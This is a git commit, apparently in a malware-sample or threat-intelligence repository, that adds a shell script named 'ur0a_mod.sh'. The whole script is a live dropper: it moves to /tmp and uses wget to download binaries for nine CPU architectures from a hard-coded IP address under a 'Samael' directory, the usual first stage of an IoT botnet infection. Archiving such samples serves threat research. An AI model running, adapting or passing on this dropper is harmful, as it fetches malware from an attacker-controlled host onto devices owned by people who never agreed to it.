204a3015645c4bd321504cee643159d90375d527
Chris Hall <chall@wapacklabs.com>
2021-10-06 12:42:12 -0400

    Add files via upload

---
+++ ur0a_mod.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+cd /tmp;wget http://179.43.149.13/Samael/x86_64;wget http://179.43.149.13/Samael/i686;wget http://179.43.149.13/Samael/i586;wget http://179.43.149.13/Samael/mips;wget http://179.43.149.13/Samael/mipsel;wget http://179.43.149.13/Samael/armv4l;wget http://179.43.149.13/Samael/armv5l;wget http://179.43.149.13/Samael/armv6l;wget http://179.43.149.13/Samael/armv7l
